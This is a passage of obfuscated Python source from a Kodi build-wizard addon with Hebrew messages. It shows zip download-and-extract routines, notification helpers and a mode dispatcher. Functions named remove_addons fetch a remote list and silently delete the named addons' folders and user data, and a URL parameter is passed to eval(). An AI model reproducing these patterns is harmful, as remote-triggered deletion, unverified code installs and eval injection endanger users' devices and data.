          OOOO0000000000000 .update (int (OOOOOOOOO0000O0O0 ),OOO000000OOOO00O0 ,O0O0000O00OOOO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6441
    O000OO0OO00O00O0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6444
    O00OOOOO0O0OO00OO .close ()#line:6447
    extract .all (O0O0000OOOOO00O0O ,O000OO0OO00O00O0O ,OOOO0000000000000 )#line:6448
    try :#line:6452
      os .remove (O0O0000OOOOO00O0O )#line:6453
    except :#line:6454
      pass #line:6455
def telemedia_android5fix ():#line:6456
    OO0O0O0O00O0O0O00 =Addon .getSetting ('systemtype')#line:6457
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in OO0O0O0O00O0O0O00 :#line:6458
        O00OO00O0OO0000OO ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6460
        O0000O0000OOOO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6461
        O0000O0OO0O0OO0O0 =xbmcgui .DialogProgress ()#line:6462
        O0000O0OO0O0OO0O0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6463
        O00OOOO0000OOO000 =os .path .join (PACKAGES ,'isr.zip')#line:6464
        O000OOOO0OOO00OO0 =urllib2 .Request (O00OO00O0OO0000OO )#line:6465
        OOOO0O0OO00OO0O0O =urllib2 .urlopen (O000OOOO0OOO00OO0 )#line:6466
        O0O00O000O00OOOO0 =xbmcgui .DialogProgress ()#line:6468
        O0O00O000O00OOOO0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6469
        O0O00O000O00OOOO0 .update (0 )#line:6470
        O000OO0OO00O00OO0 =open (O00OOOO0000OOO000 ,'wb')#line:6472
        try :#line:6474
          O0OOOO0OO0OO00OOO =OOOO0O0OO00OO0O0O .info ().getheader ('Content-Length').strip ()#line:6475
          OO0O0OOO0OOO0O00O =True #line:6476
        except AttributeError :#line:6477
              OO0O0OOO0OOO0O00O =False #line:6478
        if OO0O0OOO0OOO0O00O :#line:6480
              O0OOOO0OO0OO00OOO =int (O0OOOO0OO0OO00OOO )#line:6481
        O000OOOOO0O0000O0 =0 #line:6483
        OOO0OO0O0000O0000 =time .time ()#line:6484
        while True :#line:6485
              OOOO0OOO0O000000O =OOOO0O0OO00OO0O0O .read (8192 )#line:6486
              if not OOOO0OOO0O000000O :#line:6487
                  sys .stdout .write ('\n')#line:6488
                  break #line:6489
              O000OOOOO0O0000O0 +=len (OOOO0OOO0O000000O )#line:6491
              O000OO0OO00O00OO0 .write (OOOO0OOO0O000000O )#line:6492
              if not OO0O0OOO0OOO0O00O :#line:6494
                  O0OOOO0OO0OO00OOO =O000OOOOO0O0000O0 #line:6495
              if O0O00O000O00OOOO0 .iscanceled ():#line:6496
                 O0O00O000O00OOOO0 .close ()#line:6497
                 try :#line:6498
                  os .remove (O00OOOO0000OOO000 )#line:6499
                 except :#line:6500
                  pass #line:6501
                 break #line:6502
              O000OOO00O0O0O00O =float (O000OOOOO0O0000O0 )/O0OOOO0OO0OO00OOO #line:6503
              O000OOO00O0O0O00O =round (O000OOO00O0O0O00O *100 ,2 )#line:6504
              OOO000O0OO000OO00 =O000OOOOO0O0000O0 /(1024 *1024 )#line:6505
              OOOOOOO0OOO00O0OO =O0OOOO0OO0OO00OOO /(1024 *1024 )#line:6506
              OO0O0OOOOOO00OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO000O0OO000OO00 ,'teal',OOOOOOO0OOO00O0OO )#line:6507
              if (time .time ()-OOO0OO0O0000O0000 )>0 :#line:6508
                O0OOO00O0O0O0OOOO =O000OOOOO0O0000O0 /(time .time ()-OOO0OO0O0000O0000 )#line:6509
                O0OOO00O0O0O0OOOO =O0OOO00O0O0O0OOOO /1024 #line:6510
              else :#line:6511
               O0OOO00O0O0O0OOOO =0 #line:6512
              OO0OOOO000OOOO0O0 ='KB'#line:6513
              if O0OOO00O0O0O0OOOO >=1024 :#line:6514
                 O0OOO00O0O0O0OOOO =O0OOO00O0O0O0OOOO /1024 #line:6515
                 OO0OOOO000OOOO0O0 ='MB'#line:6516
              if O0OOO00O0O0O0OOOO >0 and not O000OOO00O0O0O00O ==100 :#line:6517
                  OOO0OOO00O0OO0O00 =(O0OOOO0OO0OO00OOO -O000OOOOO0O0000O0 )/O0OOO00O0O0O0OOOO #line:6518
              else :#line:6519
                  OOO0OOO00O0OO0O00 =0 #line:6520
              OOO000O0OO00O0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00O0O0O0OOOO ,OO0OOOO000OOOO0O0 )#line:6521
              O0O00O000O00OOOO0 .update (int (O000OOO00O0O0O00O ),OO0O0OOOOOO00OO0O ,OOO000O0OO00O0000 +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6523
        OO0OO0O0O000O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6526
        O000OO0OO00O00OO0 .close ()#line:6529
        extract .all (O00OOOO0000OOO000 ,OO0OO0O0O000O0OO0 ,O0O00O000O00OOOO0 )#line:6530
        try :#line:6534
          os .remove (O00OOOO0000OOO000 )#line:6535
        except :#line:6536
          pass #line:6537
def testnotify ():#line:6540
	OO00OO0OOOOO00OO0 =wiz .workingURL (NOTIFICATION )#line:6541
	if OO00OO0OOOOO00OO0 ==True :#line:6542
		try :#line:6543
			OO000OOO0O0O0000O ,OOO00O0OO0OO0000O =wiz .splitNotify (NOTIFICATION )#line:6544
			if OO000OOO0O0O0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6545
			if STARTP2 ()=='ok':#line:6546
				notify .notification (OOO00O0OO0OO0000O ,True )#line:6547
		except Exception as OO0O0O0O0OO00O0OO :#line:6548
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0O0O0OO00O0OO ),xbmc .LOGERROR )#line:6549
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6550
def testnotify2 ():#line:6551
	OO0O00OO000O000O0 =wiz .workingURL (NOTIFICATION2 )#line:6552
	if OO0O00OO000O000O0 ==True :#line:6553
		try :#line:6554
			OOO00OOO0O0OOO0OO ,O00000000OO000O00 =wiz .splitNotify (NOTIFICATION2 )#line:6555
			if OOO00OOO0O0OOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6556
			if STARTP2 ()=='ok':#line:6557
				notify .notification2 (O00000000OO000O00 ,True )#line:6558
		except Exception as O00O0OOOO000O00O0 :#line:6559
			wiz .log ("Error on Notifications Window: %s"%str (O00O0OOOO000O00O0 ),xbmc .LOGERROR )#line:6560
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6561
def testnotify3 ():#line:6562
	OO0000OO00OOO0000 =wiz .workingURL (NOTIFICATION3 )#line:6563
	if OO0000OO00OOO0000 ==True :#line:6564
		try :#line:6565
			OOOO000O0OO00O000 ,OOOO0OOOOOOO00O00 =wiz .splitNotify (NOTIFICATION3 )#line:6566
			if OOOO000O0OO00O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6567
			if STARTP2 ()=='ok':#line:6568
				notify .notification3 (OOOO0OOOOOOO00O00 ,True )#line:6569
		except Exception as O00O00O00000OO00O :#line:6570
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O00000OO00O ),xbmc .LOGERROR )#line:6571
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6572
def wait ():#line:6573
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6574
def infobuild ():#line:6575
	O00O000O0O00O0O0O =wiz .workingURL (NOTIFICATION )#line:6576
	if O00O000O0O00O0O0O ==True :#line:6577
		try :#line:6578
			O00O0OO0OO000000O ,O0OOO0OO0O0OO0000 =wiz .splitNotify (NOTIFICATION )#line:6579
			if O00O0OO0OO000000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6580
			if STARTP2 ()=='ok':#line:6581
				notify .updateinfo (O0OOO0OO0O0OO0000 ,True )#line:6582
		except Exception as O00OO000OO000O00O :#line:6583
			wiz .log ("Error on Notifications Window: %s"%str (O00OO000OO000O00O ),xbmc .LOGERROR )#line:6584
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6585
def servicemanual ():#line:6586
	O00O0O0000OO00O00 =wiz .workingURL (HELPINFO )#line:6587
	if O00O0O0000OO00O00 ==True :#line:6588
		try :#line:6589
			OOO00O00OO0OO00O0 ,OOOO0OOO0OO0O0O00 =wiz .splitNotify (HELPINFO )#line:6590
			if OOO00O00OO0OO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6591
			notify .helpinfo (OOOO0OOO0OO0O0O00 ,True )#line:6592
		except Exception as OOOOOOOO00OOOOOO0 :#line:6593
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOOOO00OOOOOO0 ),xbmc .LOGERROR )#line:6594
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6595
def testupdate ():#line:6597
	if BUILDNAME =="":#line:6598
		notify .updateWindow ()#line:6599
	else :#line:6600
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6601
def testfirst ():#line:6603
	notify .firstRun ()#line:6604
def testfirstRun ():#line:6606
	notify .firstRunSettings ()#line:6607
def fastinstall ():#line:6610
	notify .firstRuninstall ()#line:6611
def addDir (O0OO0OO00OOO0000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6618
	OO00000OOOOOO0OO0 =sys .argv [0 ]#line:6619
	if not mode ==None :OO00000OOOOOO0OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6620
	if not name ==None :OO00000OOOOOO0OO0 +="&name="+urllib .quote_plus (name )#line:6621
	if not url ==None :OO00000OOOOOO0OO0 +="&url="+urllib .quote_plus (url )#line:6622
	O0OOOO000OOO00000 =True #line:6623
	if themeit :O0OO0OO00OOO0000O =themeit %O0OO0OO00OOO0000O #line:6624
	O0OO00O0OO000OOO0 =xbmcgui .ListItem (O0OO0OO00OOO0000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6625
	O0OO00O0OO000OOO0 .setInfo (type ="Video",infoLabels ={"Title":O0OO0OO00OOO0000O ,"Plot":description })#line:6626
	O0OO00O0OO000OOO0 .setProperty ("Fanart_Image",fanart )#line:6627
	if not menu ==None :O0OO00O0OO000OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6628
	O0OOOO000OOO00000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00000OOOOOO0OO0 ,listitem =O0OO00O0OO000OOO0 ,isFolder =True )#line:6629
	return O0OOOO000OOO00000 #line:6630
def addFile (OO0OOO0O0OO0O0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6632
	OOOO000OOO0OOOOOO =sys .argv [0 ]#line:6633
	if not mode ==None :OOOO000OOO0OOOOOO +="?mode=%s"%urllib .quote_plus (mode )#line:6634
	if not name ==None :OOOO000OOO0OOOOOO +="&name="+urllib .quote_plus (name )#line:6635
	if not url ==None :OOOO000OOO0OOOOOO +="&url="+urllib .quote_plus (url )#line:6636
	OO0O0OO0O00OOO0O0 =True #line:6637
	if themeit :OO0OOO0O0OO0O0OOO =themeit %OO0OOO0O0OO0O0OOO #line:6638
	O0O0OO000OO0OOOO0 =xbmcgui .ListItem (OO0OOO0O0OO0O0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6639
	O0O0OO000OO0OOOO0 .setInfo (type ="Video",infoLabels ={"Title":OO0OOO0O0OO0O0OOO ,"Plot":description })#line:6640
	O0O0OO000OO0OOOO0 .setProperty ("Fanart_Image",fanart )#line:6641
	if not menu ==None :O0O0OO000OO0OOOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6642
	OO0O0OO0O00OOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO000OOO0OOOOOO ,listitem =O0O0OO000OO0OOOO0 ,isFolder =False )#line:6643
	return OO0O0OO0O00OOO0O0 #line:6644
def get_params ():#line:6646
	OOOO000O0O00OO000 =[]#line:6647
	O00OO00O000OO00O0 =sys .argv [2 ]#line:6648
	if len (O00OO00O000OO00O0 )>=2 :#line:6649
		OOO0O00000OO0OO0O =sys .argv [2 ]#line:6650
		O00O0O00OO0O00OOO =OOO0O00000OO0OO0O .replace ('?','')#line:6651
		if (OOO0O00000OO0OO0O [len (OOO0O00000OO0OO0O )-1 ]=='/'):#line:6652
			OOO0O00000OO0OO0O =OOO0O00000OO0OO0O [0 :len (OOO0O00000OO0OO0O )-2 ]#line:6653
		O00O000O0OO00O00O =O00O0O00OO0O00OOO .split ('&')#line:6654
		OOOO000O0O00OO000 ={}#line:6655
		for OOOOOO000O0O0OOO0 in range (len (O00O000O0OO00O00O )):#line:6656
			O0OOO00000OOOOO00 ={}#line:6657
			O0OOO00000OOOOO00 =O00O000O0OO00O00O [OOOOOO000O0O0OOO0 ].split ('=')#line:6658
			if (len (O0OOO00000OOOOO00 ))==2 :#line:6659
				OOOO000O0O00OO000 [O0OOO00000OOOOO00 [0 ]]=O0OOO00000OOOOO00 [1 ]#line:6660
		return OOOO000O0O00OO000 #line:6662
def remove_addons ():#line:6664
	try :#line:6665
			import json #line:6666
			O0O00OO000O0OOOOO =urllib2 .urlopen (remove_url ).readlines ()#line:6667
			for O00O0OOO000OOOO0O in O0O00OO000O0OOOOO :#line:6668
				OOOOO000O0000OO00 =O00O0OOO000OOOO0O .split (':')[1 ].strip ()#line:6670
				O0OOOO0OO00OO00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOOO000O0000OO00 ,'false')#line:6671
				OOO000O0O0O0O0OOO =xbmc .executeJSONRPC (O0OOOO0OO00OO00OO )#line:6672
				OO0000OOO0OOO0OO0 =json .loads (OOO000O0O0O0O0OOO )#line:6673
				O000O00O0O0OOOO00 =os .path .join (addons_folder ,OOOOO000O0000OO00 )#line:6675
				if os .path .exists (O000O00O0O0OOOO00 ):#line:6677
					for OO00OOOOO0OO0000O ,O0OOO0O00OO0O0O00 ,O0O00O0O0OO000OOO in os .walk (O000O00O0O0OOOO00 ):#line:6678
						for O0O0OO0O0O0O0O000 in O0O00O0O0OO000OOO :#line:6679
							os .unlink (os .path .join (OO00OOOOO0OO0000O ,O0O0OO0O0O0O0O000 ))#line:6680
						for OO0OOO0O0OO0O0OO0 in O0OOO0O00OO0O0O00 :#line:6681
							shutil .rmtree (os .path .join (OO00OOOOO0OO0000O ,OO0OOO0O0OO0O0OO0 ))#line:6682
					os .rmdir (O000O00O0O0OOOO00 )#line:6683
			xbmc .executebuiltin ('Container.Refresh')#line:6685
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6686
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6687
	except :pass #line:6688
def remove_addons2 ():#line:6689
	try :#line:6690
			import json #line:6691
			O0OO00O00OOOOO0OO =urllib2 .urlopen (remove_url2 ).readlines ()#line:6692
			for O0OOOOO00O00OO00O in O0OO00O00OOOOO0OO :#line:6693
				OOOOOOOO0OOO00O0O =O0OOOOO00O00OO00O .split (':')[1 ].strip ()#line:6695
				OO0OO0O0000OOOOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOOOOOO0OOO00O0O ,'false')#line:6696
				OOOO0O0OO0000OOO0 =xbmc .executeJSONRPC (OO0OO0O0000OOOOO0 )#line:6697
				O00OOO00000OO0000 =json .loads (OOOO0O0OO0000OOO0 )#line:6698
				OOO0O0OOO000O00O0 =os .path .join (user_folder ,OOOOOOOO0OOO00O0O )#line:6700
				if os .path .exists (OOO0O0OOO000O00O0 ):#line:6702
					for OO0OO0O0O0O000000 ,O0OO00O000000O0O0 ,OO0OOOOO000000O0O in os .walk (OOO0O0OOO000O00O0 ):#line:6703
						for OOOOOO0O0O0O000OO in OO0OOOOO000000O0O :#line:6704
							os .unlink (os .path .join (OO0OO0O0O0O000000 ,OOOOOO0O0O0O000OO ))#line:6705
						for OO0000OO000O000OO in O0OO00O000000O0O0 :#line:6706
							shutil .rmtree (os .path .join (OO0OO0O0O0O000000 ,OO0000OO000O000OO ))#line:6707
					os .rmdir (OOO0O0OOO000O00O0 )#line:6708
	except :pass #line:6710
params =get_params ()#line:6711
url =None #line:6712
name =None #line:6713
mode =None #line:6714
try :mode =urllib .unquote_plus (params ["mode"])#line:6716
except :pass #line:6717
try :name =urllib .unquote_plus (params ["name"])#line:6718
except :pass #line:6719
try :url =urllib .unquote_plus (params ["url"])#line:6720
except :pass #line:6721
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6722
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6724
        file .write (str ('Done'))#line:6726
        file .close ()#line:6727
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6728
        xbmc .sleep (2000 )#line:6729
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6730
        ADDON .setSetting ('systemtype',label )#line:6731
def setView (O0O000OO0O00OO00O ,OO00O00O0000O000O ):#line:6733
	if wiz .getS ('auto-view')=='true':#line:6734
		O0O000OOO00O00O00 =wiz .getS (OO00O00O0000O000O )#line:6735
		if O0O000OOO00O00O00 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O000OOO00O00O00 ='55'#line:6736
		if O0O000OOO00O00O00 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O000OOO00O00O00 ='50'#line:6737
		wiz .ebi ("Container.SetViewMode(%s)"%O0O000OOO00O00O00 )#line:6738
if mode ==None :index ()#line:6740
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6742
elif mode =='builds':buildMenu ()#line:6743
elif mode =='viewbuild':viewBuild (name )#line:6744
elif mode =='buildinfo':buildInfo (name )#line:6745
elif mode =='buildpreview':buildVideo (name )#line:6746
elif mode =='install':buildWizard (name ,url )#line:6747
elif mode =='theme':buildWizard (name ,mode ,url )#line:6748
elif mode =='viewthirdparty':viewThirdList (name )#line:6749
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6750
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6751
elif mode =='maint':maintMenu (name )#line:6753
elif mode =='passpin':passandpin ()#line:6754
elif mode =='backmyupbuild':backmyupbuild ()#line:6755
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6756
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6757
elif mode =='advancedsetting':advancedWindow (name )#line:6758
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6759
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6760
elif mode =='asciicheck':wiz .asciiCheck ()#line:6761
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6762
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6763
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6764
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6765
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6766
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6767
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6768
elif mode =='currentsettings':viewAdvanced ()#line:6769
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6770
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6771
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6772
elif mode =='fixskin':backtokodi ()#line:6773
elif mode =='testcommand':testcommand ()#line:6774
elif mode =='logsend':logsend ()#line:6775
elif mode =='rdon':rdon ()#line:6776
elif mode =='rdoff':rdoff ()#line:6777
elif mode =='setrd':setrealdebrid ()#line:6778
elif mode =='setrd2':setautorealdebrid ()#line:6779
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6780
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6781
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6782
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6783
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6784
elif mode =='freshstart':freshStart ()#line:6785
elif mode =='forceupdate':wiz .forceUpdate ()#line:6786
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6787
elif mode =='forceclose':wiz .killxbmc ()#line:6788
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6789
elif mode =='hidepassword':wiz .hidePassword ()#line:6790
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6791
elif mode =='enableaddons':enableAddons ()#line:6792
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6793
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6794
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6795
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6796
elif mode =='uploadlog':uploadLog .Main ()#line:6797
elif mode =='viewlog':LogViewer ()#line:6798
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6799
elif mode =='viewerrorlog':errorChecking (all =True )#line:6800
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6801
elif mode =='purgedb':purgeDb ()#line:6802
elif mode =='fixaddonupdate':fixUpdate ()#line:6803
elif mode =='removeaddons':removeAddonMenu ()#line:6804
elif mode =='removeaddon':removeAddon (name )#line:6805
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6806
elif mode =='removedata':removeAddonData (name )#line:6807
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6808
elif mode =='systeminfo':systemInfo ()#line:6809
elif mode =='restorezip':restoreit ('build')#line:6810
elif mode =='restoregui':restoreit ('gui')#line:6811
elif mode =='restoreaddon':restoreit ('addondata')#line:6812
elif mode =='restoreextzip':restoreextit ('build')#line:6813
elif mode =='restoreextgui':restoreextit ('gui')#line:6814
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6815
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6816
elif mode =='traktsync':traktsync ()#line:6817
elif mode =='apk':apkMenu (name )#line:6819
elif mode =='apkscrape':apkScraper (name )#line:6820
elif mode =='apkinstall':apkInstaller (name ,url )#line:6821
elif mode =='speed':speedMenu ()#line:6822
elif mode =='net':net_tools ()#line:6823
elif mode =='GetList':GetList (url )#line:6824
elif mode =='youtube':youtubeMenu (name )#line:6825
elif mode =='viewVideo':playVideo (url )#line:6826
elif mode =='addons':addonMenu (name )#line:6828
elif mode =='addoninstall':addonInstaller (name ,url )#line:6829
elif mode =='savedata':saveMenu ()#line:6831
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6832
elif mode =='managedata':manageSaveData (name )#line:6833
elif mode =='whitelist':wiz .whiteList (name )#line:6834
elif mode =='trakt':traktMenu ()#line:6836
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6837
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6838
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6839
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6840
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6841
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6842
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6843
elif mode =='realdebrid':realMenu ()#line:6845
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6846
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6847
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6848
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6849
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6850
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6851
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6852
elif mode =='login':loginMenu ()#line:6854
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6855
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6856
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6857
elif mode =='clearlogin':loginit .clearSaved (name )#line:6858
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6859
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6860
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6861
elif mode =='contact':notify .contact (CONTACT )#line:6863
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6864
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6865
elif mode =='developer':developer ()#line:6867
elif mode =='converttext':wiz .convertText ()#line:6868
elif mode =='createqr':wiz .createQR ()#line:6869
elif mode =='testnotify':testnotify ()#line:6870
elif mode =='testnotify2':testnotify2 ()#line:6871
elif mode =='servicemanual':servicemanual ()#line:6872
elif mode =='fastinstall':fastinstall ()#line:6873
elif mode =='testupdate':testupdate ()#line:6874
elif mode =='testfirst':testfirst ()#line:6875
elif mode =='testfirstrun':testfirstRun ()#line:6876
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6877
elif mode =='bg':wiz .bg_install (name ,url )#line:6879
elif mode =='bgcustom':wiz .bg_custom ()#line:6880
elif mode =='bgremove':wiz .bg_remove ()#line:6881
elif mode =='bgdefault':wiz .bg_default ()#line:6882
elif mode =='rdset':rdsetup ()#line:6883
elif mode =='mor':morsetup ()#line:6884
elif mode =='mor2':morsetup2 ()#line:6885
elif mode =='resolveurl':resolveurlsetup ()#line:6886
elif mode =='urlresolver':urlresolversetup ()#line:6887
elif mode =='forcefastupdate':forcefastupdate ()#line:6888
elif mode =='traktset':traktsetup ()#line:6889
elif mode =='placentaset':placentasetup ()#line:6890
elif mode =='flixnetset':flixnetsetup ()#line:6891
elif mode =='reptiliaset':reptiliasetup ()#line:6892
elif mode =='yodasset':yodasetup ()#line:6893
elif mode =='numbersset':numberssetup ()#line:6894
elif mode =='uranusset':uranussetup ()#line:6895
elif mode =='genesisset':genesissetup ()#line:6896
elif mode =='fastupdate':fastupdate ()#line:6897
elif mode =='folderback':folderback ()#line:6898
elif mode =='menudata':Menu ()#line:6899
elif mode =='infoupdate':infobuild ()#line:6900
elif mode =='wait':wait ()#line:6901
elif mode ==2 :#line:6902
        wiz .torent_menu ()#line:6903
elif mode ==3 :#line:6904
        wiz .popcorn_menu ()#line:6905
elif mode ==8 :#line:6906
        wiz .metaliq_fix ()#line:6907
elif mode ==9 :#line:6908
        wiz .quasar_menu ()#line:6909
elif mode ==5 :#line:6910
        swapSkins ('skin.Premium.mod')#line:6911
elif mode ==13 :#line:6912
        wiz .elementum_menu ()#line:6913
elif mode ==16 :#line:6914
        wiz .fix_wizard ()#line:6915
elif mode ==17 :#line:6916
        wiz .last_play ()#line:6917
elif mode ==18 :#line:6918
        wiz .normal_metalliq ()#line:6919
elif mode ==19 :#line:6920
        wiz .fast_metalliq ()#line:6921
elif mode ==20 :#line:6922
        wiz .fix_buffer2 ()#line:6923
elif mode ==21 :#line:6924
        wiz .fix_buffer3 ()#line:6925
elif mode ==11 :#line:6926
        wiz .fix_buffer ()#line:6927
elif mode ==15 :#line:6928
        wiz .fix_font ()#line:6929
elif mode ==14 :#line:6930
